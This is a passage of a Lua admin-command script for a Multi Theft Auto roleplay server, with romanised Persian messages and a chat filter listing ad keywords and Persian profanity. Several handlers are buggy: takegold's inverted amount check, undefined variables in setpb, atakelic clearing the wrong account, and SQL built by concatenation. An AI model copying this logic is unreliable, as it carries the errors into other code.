--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function specPlayerOff ( thePlayer, command )
    if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 5 then
      outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
      return false
    end
	if getElementData(thePlayer, "inSpect") == true then
		setCameraTarget(thePlayer, thePlayer)
		setElementData(thePlayer, "inSpect", nil)
		outputChatBox("#ff0000Shoma Az Halate Spectate Kharej Shodid!", thePlayer, 255, 255, 255, true)
	else
		outputChatBox("#ff0000[Error]: #ffffffShoma Dar Spectate Nistid!", thePlayer, 255, 255, 255, true)
	end
end
addCommandHandler("spcoff", specPlayerOff )
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("setgm",
function ( thePlayer, command, player )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 12 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer(player)
	local targetPlayer = getPlayerName ( find )
	if player then
	if find then
	if getElementData(find,"godmode") == true then
		outputChatBox("#00ff00[Done]: #ffffffShoma God Mode #00ff00"..targetPlayer.." #ffffffRa Off Kardid!", thePlayer, 255, 255, 255, true)
		setElementData(find,"godmode",nil)
	else
		outputChatBox("#00ff00[Done]: #ffffffShoma God Mode #00ff00"..targetPlayer.." #ffffffRa On Kardid!", thePlayer, 255, 255, 255, true)
		setElementData(find,"godmode",true)
	end
	else
		outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
    end
	else
		outputChatBox("#C0C0C0Syntax: /setgm <PartOfName/ID>", thePlayer, 255, 255, 255, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function distanceHeal (thePlayer, cmd, dis, heal)
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
			outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
			if dis then
				local disNum = tonumber(dis)
				if disNum then
					if heal then
						local healNum = tonumber(heal)
						if healNum then
							local x,y,z = getElementPosition(thePlayer)
							local Sphere = createColSphere( x,y,z, disNum )
							local nearbyPlayers = getElementsWithinColShape( Sphere, "player" ) 
							destroyElement(Sphere)
							for index,players in ipairs(nearbyPlayers) do
								if getElementData(players,"loggedIn") == true then
									setElementHealth(players,healNum)
									outputChatBox("#00ff00[Tavajoh] #ffffff"..getPlayerName(thePlayer).." #00ff00Health'e Shoma Ra Be #ffffff"..healNum.." #00ff00Set Kard!", players, 0, 255, 0,true)
								end
							end
						else
							outputChatBox("#ff0000[Error]: #ffffffBaraye Heal Bayad Adad Vared Konid!",thePlayer,255,255,255,true)
						end
					else
						outputChatBox("#ff0000[Error]: #ffffffMeghdar Heal Ra Vared Konid!",thePlayer,255,255,255,true)
					end
				else
					outputChatBox("#ff0000[Error]: #ffffffBaraye Fasele Bayad Adad Vared Konid!",thePlayer,255,255,255,true)
				end
		else
			outputChatBox("#C0C0C0Syntax: /sethpall <Distance> <Value>", thePlayer, 255, 255, 255, true)
		end
end
addCommandHandler("sethpall",distanceHeal)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function distanceTakeGun (thePlayer, cmd, dis)
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
			outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
			if dis then
				local disNum = tonumber(dis)
				if disNum then
							local x,y,z = getElementPosition(thePlayer)
							local Sphere = createColSphere( x,y,z, disNum )
							local nearbyPlayers = getElementsWithinColShape( Sphere, "player" ) 
							destroyElement(Sphere)
							for index,players in ipairs(nearbyPlayers) do
								if getElementData(players,"loggedIn") == true then
									takeAllWeapons(players)
									outputChatBox("#ff0000[Tavajoh] "..getPlayerName(thePlayer).." Tamamie Aslahe Haye Shoma Ra Gereft!", players, 0, 255, 0,true)
								end
							end
				else
					outputChatBox("#ff0000[Error]: #ffffffBaraye Fasele Bayad Adad Vared Konid!",thePlayer,255,255,255,true)
				end
		else
			outputChatBox("#C0C0C0Syntax: /takegunall <Distance>", thePlayer, 255, 255, 255, true)
		end
end
addCommandHandler("takegunall",distanceTakeGun)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function distanceGiveGun (thePlayer, cmd, dis, gunid, tir)
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 3 then
			outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
			if dis then
				local disNum = tonumber(dis)
				if disNum then
					if gunid then
						local gunidNum = tonumber(gunid)
						local tirNum = tonumber(tir)
						if gunidNum then
						if tir then
						if tirNum then
							local x,y,z = getElementPosition(thePlayer)
							local Sphere = createColSphere( x,y,z, disNum )
							local nearbyPlayers = getElementsWithinColShape( Sphere, "player" ) 
							destroyElement(Sphere)
							for index,players in ipairs(nearbyPlayers) do
								if getElementData(players,"loggedIn") == true then
									giveWeapon(players, gunidNum, tirNum)
									outputChatBox("#00ff00[Tavajoh] #ffffff"..getPlayerName(thePlayer).." #00ff00Be Shoma #ffffff"..getWeaponNameFromID(gunidNum).." ("..tirNum..") #00ff00Dad!", players, 0, 255, 0,true)
								end
							end
						else
							outputChatBox("#ff0000[Error]: #ffffffBaraye Tedad Tir Bayad Adad Vared Konid!",thePlayer,255,255,255,true)
						end
						else
							outputChatBox("#ff0000[Error]: #ffffffTedad Tir Ra Vared Konid!",thePlayer,255,255,255,true)
						end
						else
							outputChatBox("#ff0000[Error]: #ffffffBaraye Gun ID Bayad Adad Vared Konid!",thePlayer,255,255,255,true)
						end
					else
						outputChatBox("#ff0000[Error]: #ffffffGun ID Ra Vared Konid!",thePlayer,255,255,255,true)
					end
				else
					outputChatBox("#ff0000[Error]: #ffffffBaraye Fasele Bayad Adad Vared Konid!",thePlayer,255,255,255,true)
				end
		else
			outputChatBox("#C0C0C0Syntax: /ggall <Distance> <Gun-ID> <Tir>", thePlayer, 255, 255, 255, true)
		end
end
addCommandHandler("ggall",distanceGiveGun)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("myvehcolor",
function ( thePlayer, command)
	local myVeh = getPedOccupiedVehicle(thePlayer)
	if myVeh then
		local color1, color2, color3, color4 = getVehicleColor ( myVeh , true)
		outputChatBox("#ffffff RGB Mashin Shoma: #E0E022"..color1.." #ffffff, #E0E022"..color2.." #ffffff, #E0E022"..color3, thePlayer, 255, 255, 255, true)
	else
		outputChatBox("#ff0000[Error]: #ffffffBaraye Inkar Bayad Savar Mashin Bashid!", thePlayer, 255, 255, 255, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim

--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("aglall",
function ( thePlayer, command, player)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 4 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer(player)
	if player then
	if find then
		setElementData(accSys:getPlayerAcc(find), "pCarLic", 200)
		setElementData(accSys:getPlayerAcc(find), "pCarLicS", 200)
		setElementData(accSys:getPlayerAcc(find), "pFlyLic", 200)
		setElementData(accSys:getPlayerAcc(find), "pBoatLic", 200)
		setElementData(accSys:getPlayerAcc(find), "pMatsLic", 200)
		setElementData(accSys:getPlayerAcc(find), "pGunLic", 200)
		outputChatBox("#00ff00[Done]: #ffffffShoma Tamamie Mojavez Haro Be #00ff00"..getPlayerName(find).." #ffffffDadid!", thePlayer, 255, 255, 255, true)
		outputChatBox("#00ff00Admin #ffffff"..getPlayerName(thePlayer).." #00ff00Tamamie #ffffffMojavez #00ff00Haro Be Shoma Dad!", find, 255, 255, 255, true)
	else
		outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#C0C0C0Syntax: /aglall <PartOfName/ID>", thePlayer, 255, 255, 255, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("tglall",
function ( thePlayer, command, player)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 4 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer(player)
	if player then
	if find then
		setElementData(accSys:getPlayerAcc(find), "pCarLic", 0)
		setElementData(accSys:getPlayerAcc(find), "pCarLicS", 0)
		setElementData(accSys:getPlayerAcc(find), "pFlyLic", 0)
		setElementData(accSys:getPlayerAcc(find), "pBoatLic", 0)
		setElementData(accSys:getPlayerAcc(find), "pMatsLic", 0)
		setElementData(accSys:getPlayerAcc(find), "pGunLic", 0)
		outputChatBox("#00ff00[Done]: #ffffffShoma Tamamie Mojavez Haye #00ff00"..getPlayerName(find).." #ffffffGereftid!", thePlayer, 255, 255, 255, true)
		outputChatBox("#00ff00Admin #ffffff"..getPlayerName(thePlayer).." #00ff00Tamamie #ffffffMojavez #00ff00Haye Shoma Ra Gereft!", find, 255, 255, 255, true)
	else
		outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#C0C0C0Syntax: /talllic <PartOfName/ID>", thePlayer, 255, 255, 255, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("givegold",
function ( thePlayer, command, player, meghdar )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		return false
	end
	if tonumber(meghdar) > 0 then
		if player then
			local find = miscSys:findPlayer ( player )
			if find then
				if meghdar then
					local targetPlayer = getPlayerName ( find )
					local meghdar = tonumber(meghdar)
					local goldPlayer = getElementData(accSys:getPlayerAcc(find), "pGold")
					setElementData(accSys:getPlayerAcc(find), "pGold", tonumber(goldPlayer) + tonumber(meghdar))
					SendDiscordLog("GiveGoldLOG", thePlayer , command, meghdar,find )
					outputChatBox("#00ff00[Done]: #ffffff Shoma Be #00ff00"..getPlayerName(find).." #ffffffMeghdar'e #00ff00"..meghdar.." #ffffffGold Dadid!", thePlayer, 255, 255, 255, true)
					outputChatBox("#00ff00[TheNight-Shop]: #ffffffPack #00ff00"..meghdar.." #ffffffAdadi Tala (Gold) Ba Movafaghiat Az Foroshgah Server  #ffffffBe Shoma Taalogh Gereft!", find, 255, 255, 255, true)
					triggerClientEvent ( find, "PlayDaryaft", find )
				else
					outputChatBox("#ff0000✖️ #ffffffMeghdar Gold Ra Vared Konid!", thePlayer, 255, 255, 255, true)
				end
			else
				outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#C0C0C0Bezan: /givegold <PartOfName/ID> <Meghdar>", thePlayer, 0, 255, 0,true)
		end
	else
		outputChatBox("Meghdar Gold Bayad Az 0 Bishtar Bashad", thePlayer,255,255,255,true)
	end
end)

addCommandHandler("takegold",
function ( thePlayer, command, player, meghdar )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		return false
	end
	if tonumber(meghdar) < 0 then
		if player then
			local find = miscSys:findPlayer ( player )
			if find then
				if meghdar then
					local targetPlayer = getPlayerName ( find )
					local meghdar = tonumber(meghdar)
					local goldPlayer = getElementData(accSys:getPlayerAcc(find), "pGold")
					setElementData(accSys:getPlayerAcc(find), "pGold", tonumber(goldPlayer) - tonumber(meghdar))
					SendDiscordLog("GiveGoldLOG", thePlayer , command, meghdar,find )
					outputChatBox("#00ff00[Done]: #ffffff Shoma Az #00ff00"..getPlayerName(find).." #ffffffMeghdar'e #00ff00-"..meghdar.." #ffffffGold Take Kardid!", thePlayer, 255, 255, 255, true)
					outputChatBox("#00ff00[TheNight-Shop]: #ffffffMeghdar #00ff00-"..meghdar.." #ffffffAdadi Tala (Gold) Ba Movafaghiat Az Shoma Take Shod!", find, 255, 255, 255, true)
					triggerClientEvent ( find, "PlayDaryaft", find )
				else
					outputChatBox("#ff0000✖️ #ffffffMeghdar Gold Ra Vared Konid!", thePlayer, 255, 255, 255, true)
				end
			else
				outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#C0C0C0Bezan: /givegold <PartOfName/ID> <Meghdar>", thePlayer, 0, 255, 0,true)
		end
	else
		outputChatBox("Meghdar Gold Bayad Az 0 Kamtar Bashad", thePlayer,255,255,255,true)
	end
end)

addCommandHandler("givepackref",
function(thePlayer, cmd, preffe, meghdar)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 10 then
		return false
	end
	if (preffe) then
		if meghdar then
			local meghdar = tonumber(meghdar)
			local reffeyarukemikhaddemoteshe = tonumber(preffe)
			local query = dbQuery(exports.mysql:getMySQLC(), "SELECT * FROM users;" )
			local result, numrows = dbPoll(query, dbpTime)
			if (result and numrows > 0) then
				for index, row in pairs(result) do
					local IDeYaru = row['pID']
					if tonumber(IDeYaru) == tonumber(reffeyarukemikhaddemoteshe) then
						local name = row['pName']
						setGoldTaraf = row['pGold'] + meghdar
						exports["notf"]:addNotification(thePlayer, "Shoma Ba Movafaghiat Pack "..meghdar.." Adadi Gold Ra Be Player "..name.." Dadid!" , 'success')
						triggerClientEvent ( thePlayer, "PlayMovafagh", thePlayer)
					end
				end
				dbFree(query)
			end
			local yek  = 0
			local query = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pGold` = '"..setGoldTaraf.."' WHERE `pID` = '"..tonumber(preffe).."'")
			dbFree(query)
			local query = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pGoldPack` = '"..meghdar.."' WHERE `pID` = '"..tonumber(preffe).."'")
			dbFree(query)
		end
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("aduty",
function(thePlayer, command)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	if getElementData(thePlayer, "adminDuty") ~= "On" then
		outputChatBox("#00ff00Shoma Be Halat'e Admin Duty Dar Omadid!", thePlayer, 255, 255, 255, true)
		setElementData(thePlayer, "adminDuty", "On")
	else
		outputChatBox("#ff0000Shoma Az Halat'e Admin Duty Kharej Shodid!", thePlayer, 255, 255, 255, true)
		setElementData(thePlayer, "adminDuty", "Off")
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
Words = { 
	"irm",
	"mta",
	"enix",
	"vcrpg",
	"sv",
	"vps",
	"server",
	"bug",
	"attack",
	"arsacia",
	"agsa",
	"samp",
	".com",
	".ir",
	"ts",
	"team speak",
	"hack",
	"viros",
	"virus",
	"paydar",
	":22003",
	":7777",
	"RezaKhan",
	"Zezaw",
	"edward",
	"LastTime",
	"GodFather",
	"Arshin",
	"ser ver",
	"plus",
	"plus mta",
	"atis",
	"iran",
	"iranmta",
	"free",
	"freeroam",
	"s*v",
	"s-v",
	--Fosh Ha--
	"kir",
	"kos",
	"jende",
	"haromzade",
	"kos amat",
	"koni",
	"haromi",
	"kos kharet",
	"kir to kos nanat",
	"madar jende",
	"kos nanat",
	"amat",
	"kose",
	"ExoPrim",
	"Exo",
}

addEventHandler("onPlayerChat", getRootElement(), function ( message ) 
	for _, word in ipairs(Words) do
		if( message:find( word ) )then
			for _, player in pairs( getElementsByType 'player' ) do
				if getElementData(player, "loggedIn") == true then
					if tonumber(getElementData(accSys:getPlayerAcc(player), "pAdmin")) > 0 then
						outputChatBox("#ff0000[ADM-Warn]: #ffffff" ..getPlayerName(source).. " Chat Kard: " ..message, player, 255, 255, 255, true )

					end
				end
			end
			return true
		end
		
	end
end )
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("notf",
	function(thePlayer, cmd, ...)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 8 then
		outputChatBox("#33AA33Error: Motasefane dastresi be in dastoor baraye shoma maghdoor nist.", thePlayer, 255, 255, 255, true)
		return false
	end
       	    	local message = table.concat({ ... }, " ")
				   disSys:SendDiscordLog("notfall",cmd,thePlayer,"",message)
				   	if #message > 0 then
               			exports["notf"]:addNotification(root, "** "..message.." **" , 'info')
					else
						outputChatBox("Bezan: /notf [Matn]", thePlayer)
					end
    end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
	addCommandHandler("givepackage",
function ( thePlayer, command, player )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		outputChatBox("#33AA33Error: Motasefane dastresi be in dastoor baraye shoma maghdoor nist.", thePlayer, 255, 255, 255, true)
		return false
	end
	
	if ( player == nil) then
		outputChatBox("#ff0000Bezan: /givepackage <PartOfName/ID>", thePlayer, 0, 255, 0,true)
	else
		local find = miscSys:findPlayer ( player )
		if find then
			local amount = 35000
			local level = 2
			local targetPlayer = getPlayerName ( find )
			local oldLevel = tonumber(getElementData(accSys:getPlayerAcc(find), "pLevel"))
			local newLevel = oldLevel + tonumber(level)
			local x, y, z = getElementPosition ( find )
			local interior = getElementInterior ( find )
			local Dimension = getElementDimension ( find )
			outputChatBox("#cbf442[Reward-System]: #ffffffShoma Be Player #cbf442"..targetPlayer.." #FFFFFFPackage Dadid!", thePlayer, 0, 255, 0,true)
			outputChatBox("#cbf442[Reward-System]: #ffffffAdmin #cbf442"..getPlayerName(thePlayer).." #ffffffBe Shoma #cbf442Package #ffffffDad!", find, 0, 255, 0, true)
			box = createObject ( 1858, x + 1, y, z - 0.3, 0, 0, 0 )
			triggerClientEvent(find,"onCreateBox",thePlayer,x + 1, y, z - 0.3)
			setElementInterior ( box, tonumber(interior) )
			setElementDimension ( box, tonumber(Dimension) )
				setTimer ( function()
					-- FIX (bugfix pass 4): the element can be gone by the time this timer
					--   fires (player quit / object destroyed). Without this guard MTA
					--   raises "Bad argument" and the rest of the callback never runs.
					if not isElement(box) then return end
					destroyElement ( box )
					setElementData(accSys:getPlayerAcc(find), "pLevel", tonumber(newLevel))
					setElementData(find, "levelPlayer", tonumber(newLevel))
					givePlayerMoney( find, tonumber( amount ) )
					setElementData(find,"RequestReward","getted")
					exports["notf"]:addNotification(find, "Package: +"..amount.."$  and  +"..level.." Level" , 'success')
				end, 3000, 1 )
			

		else
			outputChatBox("#ff0000[Error]: #ffffffChenin Playeri Peyda Nashod!", thePlayer, 0, 255, 0,true)
		end
	end
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("respawnall",
function(thePlayer, cmd)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 8 then
		return false
	end
	for k, hame_Playera	in ipairs (getElementsByType("player")) do	
		executeCommandHandler ( "respawn", thePlayer, getPlayerName(hame_Playera) )
	end
	outputChatBox("#ff0000[ADM-System]:#ffffff Admin #ff0000"..getPlayerName(thePlayer).." #ffffffHame Player Haye Dakhel Server Ra #ff0000Respawn #ffffffKard!", hame_Playera, 255, 255, 255, true)
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim

addCommandHandler("setpb",
function ( thePlayer, command, player, score )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		outputChatBox("#33AA33Error: Motasefane dastresi be in dastoor baraye shoma maghdoor nist.", thePlayer, 255, 255, 255, true)
		return false
	end
		local find = miscSys:findPlayer ( player )
		if find then
			local targetPlayer = getPlayerName ( find )
			local score = tonumber(score)
			setElementData(find,"paintscore",score)
			setElementData(accSys:getPlayerAcc(find), "pExp", tonumber(respectPlayer) + tonumber(tedad))
			outputChatBox("#ff0000[ADM-System]:#ffffff Admin #ff0000"..getPlayerName(thePlayer).." #ffffffBe Shoma Tedad "..tedad.." PB Score Dad!", find, 255, 255, 255, true)
			outputChatBox("#00ff00[Done]:#ffffff Shoma Be #ff0000"..getPlayerName(find).." #ffffff Tedad "..tedad.." PB Score Dadid!", thePlayer, 255, 255, 255, true)
		else
			outputChatBox("#ff0000[Error]:#ffffffChenin Playeri Peyda Nashod!", thePlayer, 0, 255, 0,true)
		end
end) 

--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
--]]
addCommandHandler("derbymode",
function ( thePlayer, command, player, score )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 12 then
		outputChatBox("#33AA33Error: Motasefane dastresi be in dastoor baraye shoma maghdoor nist.", thePlayer, 255, 255, 255, true)
		return false
	end
	if getElementData(thePlayer,"derbymode") == true then
		outputChatBox("#ff0000[Healing-Factor]:#ffffff Halate Derby #ff0000Off #ffffffShod!", thePlayer, 255, 255, 255, true)
		setElementData(thePlayer,"derbymode",nil)
	else
		outputChatBox("#ff0000[Healing-Factor]:#ffffff Halate Derby #00ff00On #ffffffShod!", thePlayer, 255, 255, 255, true)
		setElementData(thePlayer,"derbymode",true)
	end
end)
--]]
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("agivelic",
function ( thePlayer, command, player, licid)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 4 then
		outputChatBox("#33AA33Error: Motasefane dastresi be in dastoor baraye shoma maghdoor nist.", thePlayer, 255, 255, 255, true)
		return false
	    end
		local find = miscSys:findPlayer ( player )
		if licid then
		if tonumber(licid) > 0 and tonumber(licid) < 7 then
		local targetPlayer = getPlayerName ( find )
		if tonumber(licid) == 1 then
        setElementData(accSys:getPlayerAcc(find), "pCarLic", 200)
		outputChatBox("#01D7FFShoma Be Player "..targetPlayer.." License Driving Dadid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Be Shoma License Driving Dad!", find, 0, 255, 0, true)
		elseif tonumber(licid) == 2 then
        setElementData(accSys:getPlayerAcc(find), "pCarLicS", 200)
		outputChatBox("#01D7FFShoma Be Player "..targetPlayer.." License Motor Dadid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Be Shoma License Motor Dad!", find, 0, 255, 0, true)
		elseif tonumber(licid) == 3 then
        setElementData(accSys:getPlayerAcc(find), "pMatsLic", 200)
		outputChatBox("#01D7FFShoma Be Player "..targetPlayer.." License Material Dadid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Be Shoma License Material Dad!", find, 0, 255, 0, true)
		elseif tonumber(licid) == 4 then
        setElementData(accSys:getPlayerAcc(find), "pGunLic", 200)
		outputChatBox("#01D7FFShoma Be Player "..targetPlayer.." License Gun Dadid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Be Shoma License Gun Dad!", find, 0, 255, 0, true)
		elseif tonumber(licid) == 5 then
        setElementData(accSys:getPlayerAcc(find), "pFlyLic", 200)
		outputChatBox("#01D7FFShoma Be Player "..targetPlayer.." License Flying Dadid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Be Shoma License Flying Dad!", find, 0, 255, 0, true)
		elseif tonumber(licid) == 6 then
        setElementData(accSys:getPlayerAcc(find), "pBoatLic", 200)
		outputChatBox("#01D7FFShoma Be Player "..targetPlayer.." License Boat Dadid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Be Shoma License Boat Dad!", find, 0, 255, 0, true)
		end
				else
					outputChatBox("#ff0000[Error]:#ffffffDadan In License ID Emkan Pazir Nis!", thePlayer, 0, 255, 0,true)
					outputChatBox("#ffff00[LicID-Help]:#ffffff1: #ffff00Driving | #ffffff2: #ffff00Motor | #ffffff3: #ffff00Mats | #ffffff4: #ffff00Gun | #ffffff5: #ffff00Fly | #ffffff5: #ffff00Boat", thePlayer, 0, 255, 0,true)
				end
		else
			outputChatBox("#ff0000[Error]:#ffffffChenin Playeri Peyda Nashod!", thePlayer, 0, 255, 0,true)
		end
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("atakelic",
function ( thePlayer, command, player, licid)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 4 then
		outputChatBox("#33AA33Error: Motasefane dastresi be in dastoor baraye shoma maghdoor nist.", thePlayer, 255, 255, 255, true)
		return false
	    end
		local find = miscSys:findPlayer ( player )
		if licid then
		if tonumber(licid) > 0 and tonumber(licid) < 7 then
		local targetPlayer = getPlayerName ( find )
		if tonumber(licid) == 1 then
        setElementData(accSys:getPlayerAcc(thePlayer), "pCarLic", 0)
		outputChatBox("#01D7FFShoma Az Player "..targetPlayer.." License Driving Ra Gereftid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Az Shoma License Driving Ra Gereft!", find, 0, 255, 0, true)
		elseif tonumber(licid) == 2 then
        setElementData(accSys:getPlayerAcc(thePlayer), "pCarLicS", 0)
		outputChatBox("#01D7FFShoma Az Player "..targetPlayer.." License Motor Ra Gereftid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Az Shoma License Motor Ra Gereft!", find, 0, 255, 0, true)
		elseif tonumber(licid) == 3 then
        setElementData(accSys:getPlayerAcc(thePlayer), "pMatsLic", 0)
		outputChatBox("#01D7FFShoma Az Player "..targetPlayer.." License Material Ra Gereftid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Az Shoma License Material Ra Gereft!", find, 0, 255, 0, true)
		elseif tonumber(licid) == 4 then
        setElementData(accSys:getPlayerAcc(thePlayer), "pGunLic", 0)
		outputChatBox("#01D7FFShoma Az Player "..targetPlayer.." License Gun Ra Gereftid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Az Shoma License Gun Ra Gereft!", find, 0, 255, 0, true)
		elseif tonumber(licid) == 5 then
        setElementData(accSys:getPlayerAcc(thePlayer), "pFlyLic", 0)
		outputChatBox("#01D7FFShoma Az Player "..targetPlayer.." License Flying Ra Gereftid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Az Shoma License Flying Ra Gereft!", find, 0, 255, 0, true)
		elseif tonumber(licid) == 6 then
        setElementData(accSys:getPlayerAcc(thePlayer), "pBoatLic", 0)
		outputChatBox("#01D7FFShoma Az Player "..targetPlayer.." License Boat Ra Gereftid!", thePlayer, 0, 255, 0,true)
		outputChatBox("#01D7FFAdmin "..getPlayerName(thePlayer).." Az Shoma License Boat Ra Gereft!", find, 0, 255, 0, true)
		end
				else
					outputChatBox("#ff0000[Error]:#ffffffDadan In License ID Emkan Pazir Nis!", thePlayer, 0, 255, 0,true)
					outputChatBox("#ffff00[LicID-Help]:#ffffff1: #ffff00Fly | #ffffff2: #ffff00Boat | #ffffff3: #ffff00Gun | #ffffff4: #ffff00Mat | #ffffff5: #ffff00Driving", thePlayer, 0, 255, 0,true)
				end
		else
			outputChatBox("#ff0000[Error]:#ffffffChenin Playeri Peyda Nashod!", thePlayer, 0, 255, 0,true)
		end
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("givemat",
function ( thePlayer, command, player, tedad )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 8 then
		return false
	end
		local find = miscSys:findPlayer ( player )
		if find then
			local targetPlayer = getPlayerName ( find )
			local tedad = tonumber(tedad)
			local MatHayeKhodesh = getElementData(accSys:getPlayerAcc(find), "pMats")
			setElementData(accSys:getPlayerAcc(find), "pMats", tonumber(MatHayeKhodesh) + tonumber(tedad))
			outputChatBox("#ff0000[ADM-System]:#ffffff Admin #ff0000"..getPlayerName(thePlayer).." #ffffffBe Shoma Tedad "..tedad.." Materials Dad!", find, 255, 255, 255, true)
			outputChatBox("#00ff00[Done]:#ffffff Shoma Be #ff0000"..getPlayerName(find).." #ffffff Tedad "..tedad.." Materials Dadid!", thePlayer, 255, 255, 255, true)
			outputDebugString("Admin "..getPlayerName(thePlayer).." Be Player "..targetPlayer.." Meghdar "..tedad.." Materials Dad!")
			for k, chat_admini in ipairs (getElementsByType("player")) do
	        if getElementData(chat_admini, "loggedIn") == true then
	        if tonumber(getElementData(accSys:getPlayerAcc(chat_admini), "pAdmin")) >= 1 then
